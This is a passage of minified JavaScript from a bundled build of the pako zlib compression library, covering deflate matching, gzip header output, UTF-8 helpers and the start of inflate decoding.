d=l.window,f=d[c]|d[c+1]<<8|d[c+2]<<16|d[c+3]<<24;r=l.ins_h=Math.imul(f,66521)+66521>>>16&l.hash_mask}const o=l.prev[c&l.w_mask]=l.head[r];return l.head[r]=c,o},Ut=l=>{const c=l.state;let r=c.pending;r>l.avail_out&&(r=l.avail_out),r!==0&&(l.output.set(c.pending_buf.subarray(c.pending_out,c.pending_out+r),l.next_out),l.next_out+=r,c.pending_out+=r,l.total_out+=r,l.avail_out-=r,c.pending-=r,c.pending===0&&(c.pending_out=0))},Mt=(l,c)=>{Z1(l,l.block_start>=0?l.block_start:-1,l.strstart-l.block_start,c),l.block_start=l.strstart,Ut(l.strm)},Ae=(l,c)=>{l.pending_buf[l.pending++]=c},Vi=(l,c)=>{l.pending_buf[l.pending++]=c>>>8&255,l.pending_buf[l.pending++]=c&255},yf=(l,c,r,o)=>{let d=l.avail_in;return d>o&&(d=o),d===0?0:(l.avail_in-=d,c.set(l.input.subarray(l.next_in,l.next_in+d),r),l.state.wrap===1?l.adler=tr(l.adler,c,d,r):l.state.wrap===2&&(l.adler=et(l.adler,c,d,r)),l.next_in+=d,l.total_in+=d,d)},jg=(l,c)=>{let r=l.max_chain_length,o=l.strstart,d,f,g=l.prev_length,y=l.nice_match;const _=l.strstart>l.w_size-va?l.strstart-(l.w_size-va):0,m=l.window,v=l.w_mask,b=l.prev,w=l.strstart+pn;let T=m[o+g-1],U=m[o+g];l.prev_length>=l.good_match&&(r>>=2),y>l.lookahead&&(y=l.lookahead);do if(d=c,!(m[d+g]!==U||m[d+g-1]!==T||m[d]!==m[o]||m[++d]!==m[o+1])){o+=2,d++;do;while(m[++o]===m[++d]&&m[++o]===m[++d]&&m[++o]===m[++d]&&m[++o]===m[++d]&&m[++o]===m[++d]&&m[++o]===m[++d]&&m[++o]===m[++d]&&m[++o]===m[++d]&&o<w);if(f=pn-(w-o),o=w-pn,f>g){if(l.match_start=c,g=f,f>=y)break;T=m[o+g-1],U=m[o+g]}}while((c=b[c&v])>_&&--r!==0);return g<=l.lookahead?g:l.lookahead},Vl=l=>{const c=l.w_size;let r,o,d;do{if(o=l.window_size-l.lookahead-l.strstart,l.strstart>=c+(c-va)&&(l.window.set(l.window.subarray(c,c+c-o),0),l.match_start-=c,l.strstart-=c,l.block_start-=c,l.insert>l.strstart&&(l.insert=l.strstart),f_(l),o+=c),l.strm.avail_in===0)break;if(r=yf(l.strm,l.window,l.strstart+l.lookahead,o),l.lookahead+=r,l.legacy_hash){if(l.lookahead+l.insert>=Te)for(d=l.strstart-l.insert,l.ins_h=l.window[d],l.ins_h=jf(l,l.ins_h,l.window[d+1]);l.insert&&(Qn(l,d),d++,l.insert--,!(l.lookahead+l.insert<Te)););}else if(l.lookahead+l.insert>Te)for(d=l.strstart-l.insert;l.insert&&(Qn(l,d),d++,l.insert--,!(l.lookahead+l.insert<=Te)););}while(l.lookahead<va&&l.strm.avail_in!==0)},Ng=(l,c)=>{let r=l.pending_buf_size-5>l.w_size?l.w_size:l.pending_buf_size-5,o,d,f,g=0,y=l.strm.avail_in;do{if(o=65535,f=l.bi_valid+42>>3,l.strm.avail_out<f||(f=l.strm.avail_out-f,d=l.strstart-l.block_start,o>d+l.strm.avail_in&&(o=d+l.strm.avail_in),o>f&&(o=f),o<r&&(o===0&&c!==Vt||c===gn||o!==d+l.strm.avail_in)))break;g=c===Vt&&o===d+l.strm.avail_in?1:0,df(l,0,0,g),l.pending_buf[l.pending-4]=o,l.pending_buf[l.pending-3]=o>>8,l.pending_buf[l.pending-2]=~o,l.pending_buf[l.pending-1]=~o>>8,Ut(l.strm),d&&(d>o&&(d=o),l.strm.output.set(l.window.subarray(l.block_start,l.block_start+d),l.strm.next_out),l.strm.next_out+=d,l.strm.avail_out-=d,l.strm.total_out+=d,l.block_start+=d,o-=d),o&&(yf(l.strm,l.strm.output,l.strm.next_out,o),l.strm.next_out+=o,l.strm.avail_out-=o,l.strm.total_out+=o)}while(g===0);return y-=l.strm.avail_in,y&&(y>=l.w_size?(l.matches=2,l.window.set(l.strm.input.subarray(l.strm.next_in-l.w_size,l.strm.next_in),0),l.strstart=l.w_size,l.insert=l.strstart):(l.window_size-l.strstart<=y&&(l.strstart-=l.w_size,l.window.set(l.window.subarray(l.w_size,l.w_size+l.strstart),0),l.matches<2&&l.matches++,l.insert>l.strstart&&(l.insert=l.strstart)),l.window.set(l.strm.input.subarray(l.strm.next_in-y,l.strm.next_in),l.strstart),l.strstart+=y,l.insert+=y>l.w_size-l.insert?l.w_size-l.insert:y),l.block_start=l.strstart),l.high_water<l.strstart&&(l.high_water=l.strstart),g?Il:c!==gn&&c!==Vt&&l.strm.avail_in===0&&l.strstart===l.block_start?Kl:(f=l.window_size-l.strstart,l.strm.avail_in>f&&l.block_start>=l.w_size&&(l.block_start-=l.w_size,l.strstart-=l.w_size,l.window.set(l.window.subarray(l.w_size,l.w_size+l.strstart),0),l.matches<2&&l.matches++,f+=l.w_size,l.insert>l.strstart&&(l.insert=l.strstart)),f>l.strm.avail_in&&(f=l.strm.avail_in),f&&(yf(l.strm,l.window,l.strstart,f),l.strstart+=f,l.insert+=f>l.w_size-l.insert?l.w_size-l.insert:f),l.high_water<l.strstart&&(l.high_water=l.strstart),f=l.bi_valid+42>>3,f=l.pending_buf_size-f>65535?65535:l.pending_buf_size-f,r=f>l.w_size?l.w_size:f,d=l.strstart-l.block_start,(d>=r||(d||c===Vt)&&c!==gn&&l.strm.avail_in===0&&d<=f)&&(o=d>f?f:d,g=c===Vt&&l.strm.avail_in===0&&o===d?1:0,df(l,l.block_start,o,g),l.block_start+=o,Ut(l.strm)),g?Vn:mt)},Pu=(l,c)=>{let r,o;for(;;){if(l.lookahead<va){if(Vl(l),l.lookahead<va&&c===gn)return mt;if(l.lookahead===0)break}if(r=0,l.lookahead>=Te&&(r=Qn(l,l.strstart)),r!==0&&l.strstart-r<=l.w_size-va&&(l.match_length=jg(l,r)),l.match_length>=Te)if(o=mn(l,l.strstart-l.match_start,l.match_length-Te),l.lookahead-=l.match_length,l.match_length<=l.max_lazy_match&&l.lookahead>=Te){l.match_length--;do l.strstart++,r=Qn(l,l.strstart);while(--l.match_length!==0);l.strstart++}else l.strstart+=l.match_length,l.match_length=0,l.legacy_hash&&(l.ins_h=l.window[l.strstart],l.ins_h=jf(l,l.ins_h,l.window[l.strstart+1]));else o=mn(l,0,l.window[l.strstart]),l.lookahead--,l.strstart++;if(o&&(Mt(l,!1),l.strm.avail_out===0))return mt}return l.insert=l.strstart<Te-1?l.strstart:Te-1,c===Vt?(Mt(l,!0),l.strm.avail_out===0?Vn:Il):l.sym_next&&(Mt(l,!1),l.strm.avail_out===0)?mt:Kl},Gl=(l,c)=>{let r,o,d;for(;;){if(l.lookahead<va){if(Vl(l),l.lookahead<va&&c===gn)return mt;if(l.lookahead===0)break}if(r=0,l.lookahead>=Te&&(r=Qn(l,l.strstart)),l.prev_length=l.match_length,l.prev_match=l.match_start,l.match_length=Te-1,r!==0&&l.prev_length<l.max_lazy_match&&l.strstart-r<=l.w_size-va&&(l.match_length=jg(l,r),l.match_length<=5&&(l.strategy===F1||l.match_length===Te&&l.strstart-l.match_start>4096)&&(l.match_length=Te-1)),l.prev_length>=Te&&l.match_length<=l.prev_length){d=l.strstart+l.lookahead-Te,o=mn(l,l.strstart-1-l.prev_match,l.prev_length-Te),l.lookahead-=l.prev_length-1,l.prev_length-=2;do++l.strstart<=d&&(r=Qn(l,l.strstart));while(--l.prev_length!==0);if(l.match_available=0,l.match_length=Te-1,l.strstart++,o&&(Mt(l,!1),l.strm.avail_out===0))return mt}else if(l.match_available){if(o=mn(l,0,l.window[l.strstart-1]),o&&Mt(l,!1),l.strstart++,l.lookahead--,l.strm.avail_out===0)return mt}else l.match_available=1,l.strstart++,l.lookahead--}return l.match_available&&(o=mn(l,0,l.window[l.strstart-1]),l.match_available=0),l.insert=l.strstart<Te-1?l.strstart:Te-1,c===Vt?(Mt(l,!0),l.strm.avail_out===0?Vn:Il):l.sym_next&&(Mt(l,!1),l.strm.avail_out===0)?mt:Kl},d_=(l,c)=>{let r,o,d,f;const g=l.window;for(;;){if(l.lookahead<=pn){if(Vl(l),l.lookahead<=pn&&c===gn)return mt;if(l.lookahead===0)break}if(l.match_length=0,l.lookahead>=Te&&l.strstart>0&&(d=l.strstart-1,o=g[d],o===g[++d]&&o===g[++d]&&o===g[++d])){f=l.strstart+pn;do;while(o===g[++d]&&o===g[++d]&&o===g[++d]&&o===g[++d]&&o===g[++d]&&o===g[++d]&&o===g[++d]&&o===g[++d]&&d<f);l.match_length=pn-(f-d),l.match_length>l.lookahead&&(l.match_length=l.lookahead)}if(l.match_length>=Te?(r=mn(l,1,l.match_length-Te),l.lookahead-=l.match_length,l.strstart+=l.match_length,l.match_length=0):(r=mn(l,0,l.window[l.strstart]),l.lookahead--,l.strstart++),r&&(Mt(l,!1),l.strm.avail_out===0))return mt}return l.insert=0,c===Vt?(Mt(l,!0),l.strm.avail_out===0?Vn:Il):l.sym_next&&(Mt(l,!1),l.strm.avail_out===0)?mt:Kl},h_=(l,c)=>{let r;for(;;){if(l.lookahead===0&&(Vl(l),l.lookahead===0)){if(c===gn)return mt;break}if(l.match_length=0,r=mn(l,0,l.window[l.strstart]),l.lookahead--,l.strstart++,r&&(Mt(l,!1),l.strm.avail_out===0))return mt}return l.insert=0,c===Vt?(Mt(l,!0),l.strm.avail_out===0?Vn:Il):l.sym_next&&(Mt(l,!1),l.strm.avail_out===0)?mt:Kl};function ha(l,c,r,o,d){this.good_length=l,this.max_lazy=c,this.nice_length=r,this.max_chain=o,this.func=d}const Ki=[new ha(0,0,0,0,Ng),new ha(4,4,8,4,Pu),new ha(4,5,16,8,Pu),new ha(4,6,32,32,Pu),new ha(4,4,16,16,Gl),new ha(8,16,32,32,Gl),new ha(8,16,128,128,Gl),new ha(8,32,128,256,Gl),new ha(32,128,258,1024,Gl),new ha(32,258,258,4096,Gl)],p_=l=>{l.window_size=2*l.w_size,hn(l.head),l.max_lazy_match=Ki[l.level].max_lazy,l.good_match=Ki[l.level].good_length,l.nice_match=Ki[l.level].nice_length,l.max_chain_length=Ki[l.level].max_chain,l.strstart=0,l.block_start=0,l.lookahead=0,l.insert=0,l.match_length=l.prev_length=Te-1,l.match_available=0,l.ins_h=0};function m_(){this.strm=null,this.status=0,this.pending_buf=null,this.pending_buf_size=0,this.pending_out=0,this.pending=0,this.wrap=0,this.gzhead=null,this.gzindex=0,this.method=ec,this.last_flush=-1,this.w_size=0,this.w_bits=0,this.w_mask=0,this.window=null,this.window_size=0,this.prev=null,this.head=null,this.ins_h=0,this.legacy_hash=0,this.hash_size=0,this.hash_bits=0,this.hash_mask=0,this.hash_shift=0,this.block_start=0,this.match_length=0,this.prev_match=0,this.match_available=0,this.strstart=0,this.match_start=0,this.lookahead=0,this.prev_length=0,this.max_chain_length=0,this.max_lazy_match=0,this.level=0,this.strategy=0,this.good_match=0,this.nice_match=0,this.dyn_ltree=new Uint16Array(s_*2),this.dyn_dtree=new Uint16Array((2*i_+1)*2),this.bl_tree=new Uint16Array((2*r_+1)*2),hn(this.dyn_ltree),hn(this.dyn_dtree),hn(this.bl_tree),this.l_desc=null,this.d_desc=null,this.bl_desc=null,this.bl_count=new Uint16Array(c_+1),this.heap=new Uint16Array(2*hf+1),hn(this.heap),this.heap_len=0,this.heap_max=0,this.depth=new Uint16Array(2*hf+1),hn(this.depth),this.sym_buf=0,this.lit_bufsize=0,this.sym_next=0,this.sym_end=0,this.opt_len=0,this.static_len=0,this.matches=0,this.insert=0,this.bi_buf=0,this.bi_valid=0}const rr=l=>{if(!l)return 1;const c=l.state;return!c||c.strm!==l||c.status!==Xl&&c.status!==Af&&c.status!==pf&&c.status!==mf&&c.status!==gf&&c.status!==vf&&c.status!==Yn&&c.status!==Qi?1:0},Cg=l=>{if(rr(l))return Zn(l,ga);l.total_in=l.total_out=0,l.data_type=W1;const c=l.state;return c.pending=0,c.pending_out=0,c.wrap<0&&(c.wrap=-c.wrap),c.status=c.wrap===2?Af:c.wrap?Xl:Yn,l.adler=c.wrap===2?0:1,c.last_flush=-2,Y1(c),ot},zg=l=>{const c=Cg(l);return c===ot&&p_(l.state),c},g_=(l,c)=>rr(l)||l.state.wrap!==2?ga:(l.state.gzhead=c,ot),Og=(l,c,r,o,d,f,g)=>{if(!l)return ga;let y=1;if(c===I1&&(c=6),o<0?(y=0,o=-o):o>15&&(y=2,o-=16),d<1||d>e_||r!==ec||o<8||o>15||c<0||c>9||f<0||f>P1||o===8&&y!==1)return Zn(l,ga);o===8&&(o=9);const _=new m_;return l.state=_,_.strm=l,_.status=Xl,_.wrap=y,_.gzhead=null,_.w_bits=o,_.w_size=1<<_.w_bits,_.w_mask=_.w_size-1,_.legacy_hash=g?1:0,_.hash_bits=d+7,!_.legacy_hash&&_.hash_bits<15&&(_.hash_bits=15),_.hash_size=1<<_.hash_bits,_.hash_mask=_.hash_size-1,_.hash_shift=~~((_.hash_bits+Te-1)/Te),_.window=new Uint8Array(_.w_size*2),_.head=new Uint16Array(_.hash_size),_.prev=new Uint16Array(_.w_size),_.lit_bufsize=1<<d+6,_.pending_buf_size=_.lit_bufsize*4,_.pending_buf=new Uint8Array(_.pending_buf_size),_.sym_buf=_.lit_bufsize,_.sym_end=(_.lit_bufsize-1)*3,_.level=c,_.strategy=f,_.method=r,zg(l)},v_=(l,c)=>Og(l,c,ec,t_,a_,$1),y_=(l,c)=>{if(rr(l)||c>xm||c<0)return l?Zn(l,ga):ga;const r=l.state;if(!l.output||l.avail_in!==0&&!l.input||r.status===Qi&&c!==Vt)return Zn(l,l.avail_out===0?Ju:ga);const o=r.last_flush;if(r.last_flush=c,r.pending!==0){if(Ut(l),l.avail_out===0)return r.last_flush=-1,ot}else if(l.avail_in===0&&Tm(c)<=Tm(o)&&c!==Vt)return Zn(l,Ju);if(r.status===Qi&&l.avail_in!==0)return Zn(l,Ju);if(r.status===Xl&&r.wrap===0&&(r.status=Yn),r.status===Xl){let d=ec+(r.w_bits-8<<4)<<8,f=-1;if(r.strategy>=Gs||r.level<2?f=0:r.level<6?f=1:r.level===6?f=2:f=3,d|=f<<6,r.strstart!==0&&(d|=o_),d+=31-d%31,Vi(r,d),r.strstart!==0&&(Vi(r,l.adler>>>16),Vi(r,l.adler&65535)),l.adler=1,r.status=Yn,Ut(l),r.pending!==0)return r.last_flush=-1,ot}if(r.status===Af){if(l.adler=0,Ae(r,31),Ae(r,139),Ae(r,8),r.gzhead)Ae(r,(r.gzhead.text?1:0)+(r.gzhead.hcrc?2:0)+(r.gzhead.extra?4:0)+(r.gzhead.name?8:0)+(r.gzhead.comment?16:0)),Ae(r,r.gzhead.time&255),Ae(r,r.gzhead.time>>8&255),Ae(r,r.gzhead.time>>16&255),Ae(r,r.gzhead.time>>24&255),Ae(r,r.level===9?2:r.strategy>=Gs||r.level<2?4:0),Ae(r,r.gzhead.os&255),r.gzhead.extra&&r.gzhead.extra.length&&(Ae(r,r.gzhead.extra.length&255),Ae(r,r.gzhead.extra.length>>8&255)),r.gzhead.hcrc&&(l.adler=et(l.adler,r.pending_buf,r.pending,0)),r.gzindex=0,r.status=pf;else if(Ae(r,0),Ae(r,0),Ae(r,0),Ae(r,0),Ae(r,0),Ae(r,r.level===9?2:r.strategy>=Gs||r.level<2?4:0),Ae(r,u_),r.status=Yn,Ut(l),r.pending!==0)return r.last_flush=-1,ot}if(r.status===pf){if(r.gzhead.extra){let d=r.pending,f=(r.gzhead.extra.length&65535)-r.gzindex;for(;r.pending+f>r.pending_buf_size;){let y=r.pending_buf_size-r.pending;if(r.pending_buf.set(r.gzhead.extra.subarray(r.gzindex,r.gzindex+y),r.pending),r.pending=r.pending_buf_size,r.gzhead.hcrc&&r.pending>d&&(l.adler=et(l.adler,r.pending_buf,r.pending-d,d)),r.gzindex+=y,Ut(l),r.pending!==0)return r.last_flush=-1,ot;d=0,f-=y}let g=new Uint8Array(r.gzhead.extra);r.pending_buf.set(g.subarray(r.gzindex,r.gzindex+f),r.pending),r.pending+=f,r.gzhead.hcrc&&r.pending>d&&(l.adler=et(l.adler,r.pending_buf,r.pending-d,d)),r.gzindex=0}r.status=mf}if(r.status===mf){if(r.gzhead.name){let d=r.pending,f;do{if(r.pending===r.pending_buf_size){if(r.gzhead.hcrc&&r.pending>d&&(l.adler=et(l.adler,r.pending_buf,r.pending-d,d)),Ut(l),r.pending!==0)return r.last_flush=-1,ot;d=0}r.gzindex<r.gzhead.name.length?f=r.gzhead.name.charCodeAt(r.gzindex++)&255:f=0,Ae(r,f)}while(f!==0);r.gzhead.hcrc&&r.pending>d&&(l.adler=et(l.adler,r.pending_buf,r.pending-d,d)),r.gzindex=0}r.status=gf}if(r.status===gf){if(r.gzhead.comment){let d=r.pending,f;do{if(r.pending===r.pending_buf_size){if(r.gzhead.hcrc&&r.pending>d&&(l.adler=et(l.adler,r.pending_buf,r.pending-d,d)),Ut(l),r.pending!==0)return r.last_flush=-1,ot;d=0}r.gzindex<r.gzhead.comment.length?f=r.gzhead.comment.charCodeAt(r.gzindex++)&255:f=0,Ae(r,f)}while(f!==0);r.gzhead.hcrc&&r.pending>d&&(l.adler=et(l.adler,r.pending_buf,r.pending-d,d))}r.status=vf}if(r.status===vf){if(r.gzhead.hcrc){if(r.pending+2>r.pending_buf_size&&(Ut(l),r.pending!==0))return r.last_flush=-1,ot;Ae(r,l.adler&255),Ae(r,l.adler>>8&255),l.adler=0}if(r.status=Yn,Ut(l),r.pending!==0)return r.last_flush=-1,ot}if(l.avail_in!==0||r.lookahead!==0||c!==gn&&r.status!==Qi){let d=r.level===0?Ng(r,c):r.strategy===Gs?h_(r,c):r.strategy===J1?d_(r,c):Ki[r.level].func(r,c);if((d===Vn||d===Il)&&(r.status=Qi),d===mt||d===Vn)return l.avail_out===0&&(r.last_flush=-1),ot;if(d===Kl&&(c===V1?X1(r):c!==xm&&(df(r,0,0,!1),c===Q1&&(hn(r.head),r.lookahead===0&&(r.strstart=0,r.block_start=0,r.insert=0))),Ut(l),l.avail_out===0))return r.last_flush=-1,ot}return c!==Vt?ot:r.wrap<=0?Sm:(r.wrap===2?(Ae(r,l.adler&255),Ae(r,l.adler>>8&255),Ae(r,l.adler>>16&255),Ae(r,l.adler>>24&255),Ae(r,l.total_in&255),Ae(r,l.total_in>>8&255),Ae(r,l.total_in>>16&255),Ae(r,l.total_in>>24&255)):(Vi(r,l.adler>>>16),Vi(r,l.adler&65535)),Ut(l),r.wrap>0&&(r.wrap=-r.wrap),r.pending!==0?ot:Sm)},b_=l=>{if(rr(l))return ga;const c=l.state.status;return l.state=null,c===Yn?Zn(l,K1):ot},__=(l,c)=>{let r=c.length;if(rr(l))return ga;const o=l.state,d=o.wrap;if(d===2||d===1&&o.status!==Xl||o.lookahead)return ga;if(d===1&&(l.adler=tr(l.adler,c,r,0)),o.wrap=0,r>=o.w_size){d===0&&(hn(o.head),o.strstart=0,o.block_start=0,o.insert=0);let _=new Uint8Array(o.w_size);_.set(c.subarray(r-o.w_size,r),0),c=_,r=o.w_size}const f=l.avail_in,g=l.next_in,y=l.input;for(l.avail_in=r,l.next_in=0,l.input=c,Vl(o);o.lookahead>=Te;){let _=o.strstart,m=o.lookahead-(Te-1);do Qn(o,_),_++;while(--m);o.strstart=_,o.lookahead=Te-1,Vl(o)}return o.strstart+=o.lookahead,o.block_start=o.strstart,o.insert=o.lookahead,o.lookahead=0,o.match_length=o.prev_length=Te-1,o.match_available=0,l.next_in=g,l.input=y,l.avail_in=f,o.wrap=d,ot};var x_=v_,S_=Og,T_=zg,w_=Cg,E_=g_,A_=y_,j_=b_,N_=__,C_="pako deflate (from Nodeca project)",Fi={deflateInit:x_,deflateInit2:S_,deflateReset:T_,deflateResetKeep:w_,deflateSetHeader:E_,deflate:A_,deflateEnd:j_,deflateSetDictionary:N_,deflateInfo:C_};const z_=(l,c)=>Object.prototype.hasOwnProperty.call(l,c);var O_=function(l){const c=Array.prototype.slice.call(arguments,1);for(;c.length;){const r=c.shift();if(r){if(typeof r!="object")throw new TypeError(r+"must be non-object");for(const o in r)z_(r,o)&&(l[o]=r[o])}}return l},R_=l=>{let c=0;for(let o=0,d=l.length;o<d;o++)c+=l[o].length;const r=new Uint8Array(c);for(let o=0,d=0,f=l.length;o<f;o++){let g=l[o];r.set(g,d),d+=g.length}return r},tc={assign:O_,flattenChunks:R_};let Rg=!0;try{String.fromCharCode.apply(null,new Uint8Array(1))}catch{Rg=!1}const ar=new Uint8Array(256);for(let l=0;l<256;l++)ar[l]=l>=252?6:l>=248?5:l>=240?4:l>=224?3:l>=192?2:1;ar[254]=ar[255]=1;var D_=l=>{if(typeof TextEncoder=="function"&&TextEncoder.prototype.encode)return new TextEncoder().encode(l);let c,r,o,d,f,g=l.length,y=0;for(d=0;d<g;d++)r=l.charCodeAt(d),(r&64512)===55296&&d+1<g&&(o=l.charCodeAt(d+1),(o&64512)===56320&&(r=65536+(r-55296<<10)+(o-56320),d++)),y+=r<128?1:r<2048?2:r<65536?3:4;for(c=new Uint8Array(y),f=0,d=0;f<y;d++)r=l.charCodeAt(d),(r&64512)===55296&&d+1<g&&(o=l.charCodeAt(d+1),(o&64512)===56320&&(r=65536+(r-55296<<10)+(o-56320),d++)),r<128?c[f++]=r:r<2048?(c[f++]=192|r>>>6,c[f++]=128|r&63):r<65536?(c[f++]=224|r>>>12,c[f++]=128|r>>>6&63,c[f++]=128|r&63):(c[f++]=240|r>>>18,c[f++]=128|r>>>12&63,c[f++]=128|r>>>6&63,c[f++]=128|r&63);return c};const U_=(l,c)=>{if(c<65534&&l.subarray&&Rg)return String.fromCharCode.apply(null,l.length===c?l:l.subarray(0,c));let r="";for(let o=0;o<c;o++)r+=String.fromCharCode(l[o]);return r};var M_=(l,c)=>{const r=c||l.length;if(typeof TextDecoder=="function"&&TextDecoder.prototype.decode)return new TextDecoder().decode(l.subarray(0,c));let o,d;const f=new Array(r*2);for(d=0,o=0;o<r;){let g=l[o++];if(g<128){f[d++]=g;continue}let y=ar[g];if(y>4){f[d++]=65533,o+=y-1;continue}for(g&=y===2?31:y===3?15:7;y>1&&o<r;)g=g<<6|l[o++]&63,y--;if(y>1){f[d++]=65533;continue}g<65536?f[d++]=g:(g-=65536,f[d++]=55296|g>>10&1023,f[d++]=56320|g&1023)}return U_(f,d)},H_=(l,c)=>{c=c||l.length,c>l.length&&(c=l.length);let r=c-1;for(;r>=0&&(l[r]&192)===128;)r--;return r<0||r===0?c:r+ar[l[r]]>c?r:c},nr={string2buf:D_,buf2string:M_,utf8border:H_};function B_(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}var Dg=B_;const Ug=Object.prototype.toString,{Z_NO_FLUSH:k_,Z_SYNC_FLUSH:L_,Z_FULL_FLUSH:G_,Z_FINISH:q_,Z_OK:Is,Z_STREAM_END:Y_,Z_DEFAULT_COMPRESSION:Z_,Z_DEFAULT_STRATEGY:X_,Z_DEFLATED:V_}=ir,Q_={level:Z_,method:V_,chunkSize:16384,windowBits:15,memLevel:8,strategy:X_,legacyHash:!0};function sr(l){this.options=tc.assign({},Q_,l||{});let c=this.options;c.raw&&c.windowBits>0?c.windowBits=-c.windowBits:c.gzip&&c.windowBits>0&&c.windowBits<16&&(c.windowBits+=16),this.err=0,this.msg="",this.ended=!1,this.chunks=[],this.strm=new Dg,this.strm.avail_out=0;let r=Fi.deflateInit2(this.strm,c.level,c.method,c.windowBits,c.memLevel,c.strategy,c.legacyHash);if(r!==Is)throw new Error(Xn[r]);if(c.header&&Fi.deflateSetHeader(this.strm,c.header),c.dictionary){let o;if(typeof c.dictionary=="string"?o=nr.string2buf(c.dictionary):Ug.call(c.dictionary)==="[object ArrayBuffer]"?o=new Uint8Array(c.dictionary):o=c.dictionary,r=Fi.deflateSetDictionary(this.strm,o),r!==Is)throw new Error(Xn[r]);this._dict_set=!0}}sr.prototype.push=function(l,c){const r=this.strm,o=this.options.chunkSize;let d,f;if(this.ended)return!1;for(c===~~c?f=c:f=c===!0?q_:k_,typeof l=="string"?r.input=nr.string2buf(l):Ug.call(l)==="[object ArrayBuffer]"?r.input=new Uint8Array(l):r.input=l,r.next_in=0,r.avail_in=r.input.length;;){if(r.avail_out===0&&(r.output=new Uint8Array(o),r.next_out=0,r.avail_out=o),(f===L_||f===G_)&&r.avail_out<=6){this.onData(r.output.subarray(0,r.next_out)),r.avail_out=0;continue}if(d=Fi.deflate(r,f),d===Y_)return r.next_out>0&&this.onData(r.output.subarray(0,r.next_out)),d=Fi.deflateEnd(this.strm),this.onEnd(d),this.ended=!0,d===Is;if(r.avail_out===0){this.onData(r.output);continue}if(f>0&&r.next_out>0){this.onData(r.output.subarray(0,r.next_out)),r.avail_out=0;continue}if(r.avail_in===0)break}return!0};sr.prototype.onData=function(l){this.chunks.push(l)};sr.prototype.onEnd=function(l){l===Is&&(this.result=tc.flattenChunks(this.chunks)),this.chunks=[],this.err=l,this.msg=this.strm.msg};function Nf(l,c){const r=new sr(c);if(r.push(l,!0),r.err)throw r.msg||Xn[r.err];return r.result}function K_(l,c){return c=c||{},c.raw=!0,Nf(l,c)}function I_(l,c){return c=c||{},c.gzip=!0,Nf(l,c)}var F_=sr,J_=Nf,P_=K_,$_=I_,W_={Deflate:F_,deflate:J_,deflateRaw:P_,gzip:$_};const qs=16209,ex=16191;var tx=function(c,r){let o,d,f,g,y,_,m,v,b,w,T,U,G,q,V,ee,W,M,Q,he,B,X,ie,K;const te=c.state;o=c.next_in,ie=c.input,d=o+(c.avail_in-5),f=c.next_out,K=c.output,g=f-(r-c.avail_out),y=f+(c.avail_out-257),_=te.dmax,m=te.wsize,v=te.whave,b=te.wnext,w=te.window,T=te.hold,U=te.bits,G=te.lencode,q=te.distcode,V=(1<<te.lenbits)-1,ee=(1<<te.distbits)-1;e:do{U<15&&(T+=ie[o++]<<U,U+=8,T+=ie[o++]<<U,U+=8),W=G[T&V];t:for(;;){if(M=W>>>24,T>>>=M,U-=M,M=W>>>16&255,M===0)K[f++]=W&65535;else if(M&16){Q=W&65535,M&=15,M&&(U<M&&(T+=ie[o++]<<U,U+=8),Q+=T&(1<<M)-1,T>>>=M,U-=M),U<15&&(T+=ie[o++]<<U,U+=8,T+=ie[o++]<<U,U+=8),W=q[T&ee];a:for(;;){if(M=W>>>24,T>>>=M,U-=M,M=W>>>16&255,M&16){if(he=W&65535,M&=15,U<M&&(T+=ie[o++]<<U,U+=8,U<M&&(T+=ie[o++]<<U,U+=8)),he+=T&(1<<M)-1,he>_){c.msg="invalid distance too far back",te.mode=qs;break e}if(T>>>=M,U-=M,M=f-g,he>M){if(M=he-M,M>v&&te.sane){c.msg="invalid distance too far back",te.mode=qs;break e}if(B=0,X=w,b===0){if(B+=m-M,M<Q){Q-=M;do K[f++]=w[B++];while(--M);B=f-he,X=K}}else if(b<M){if(B+=m+b-M,M-=b,M<Q){Q-=M;do K[f++]=w[B++];while(--M);if(B=0,b<Q){M=b,Q-=M;do K[f++]=w[B++];while(--M);B=f-he,X=K}}}else if(B+=b-M,M<Q){Q-=M;do K[f++]=w[B++];while(--M);B=f-he,X=K}for(;Q>2;)K[f++]=X[B++],K[f++]=X[B++],K[f++]=X[B++],Q-=3;Q&&(K[f++]=X[B++],Q>1&&(K[f++]=X[B++]))}else{B=f-he;do K[f++]=K[B++],K[f++]=K[B++],K[f++]=K[B++],Q-=3;while(Q>2);Q&&(K[f++]=K[B++],Q>1&&(K[f++]=K[B++]))}}else if((M&64)===0){W=q[(W&65535)+(T&(1<<M)-1)];continue a}else{c.msg="invalid distance code",te.mode=qs;break e}break}}else if((M&64)===0){W=G[(W&65535)+(T&(1<<M)-1)];continue t}else if(M&32){te.mode=ex;break e}else{c.msg="invalid literal/length code",te.mode=qs;break e}break}}while(o<d&&f<y);Q=U>>3,o-=Q,U-=Q<<3,T&=(1<<U)-1,c.next_in=o,c.next_out=f,c.avail_in=o<d?5+(d-o):5-(o-d),c.avail_out=f<y?257+(y-f):257-(f-y),te.hold=T,te.bits=U};const ql=15,wm=852,Em=592,Am=0,$u=1,jm=2,ax=new Uint16Array([3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,0,0]),nx=new Uint8Array([16,16,16,16,16,16,16,16,17,17,17,17,18,18,18,18,19,19,19,19,20,20,20,20,21,21,21,21,16,199,75]),lx=new Uint16Array([1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0]),ix=new Uint8Array([16,16,16,16,17,17,18,18,19,19,20,20,21,21,22,22,23,23,24,24,25,25,26,26,27,27,28,28,29,29,64,64]),rx=(l,c,r,o,d,f,g,y)=>{const _=y.bits;let m=0,v=0,b=0,w=0,T=0,U=0,G=0,q=0,V=0,ee=0,W,M,Q,he,B,X=null,ie;const K=new Uint16Array(ql+1),te=new Uint16Array(ql+1);let le=null,be,Xe,_e;for(m=0;m<=ql;m++)K[m]=0;for(v=0;v<o;v++)K[c[r+v]]++;for(T=_,w=ql;w>=1&&K[w]===0;w--);if(T>w&&(T=w),w===0)return 